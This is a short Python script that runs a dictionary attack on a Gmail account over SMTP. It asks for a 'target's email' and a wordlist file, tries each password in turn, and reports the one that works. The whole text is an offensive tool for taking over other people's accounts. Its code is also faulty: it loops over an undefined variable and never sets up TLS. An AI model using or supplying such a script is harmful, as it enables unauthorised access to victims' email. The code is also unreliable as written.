import smtplib

smtpasrver = smtplib.SMTP("smtp.gmail.com", 587)
smtpasrver.ehlo( )

user = raw_input("Enter the target's email : ")
password = raw_input("Enter the password File : ")
password = open(password, "r")

for password in passwordfile :
	try :
		    smtpasrver.login(user, password)
		    print ("password found ==> ", password)
		    break;
	except smtplib.SMTPAuthenticationError:
		    print ("password is incorrect ==> ", password)
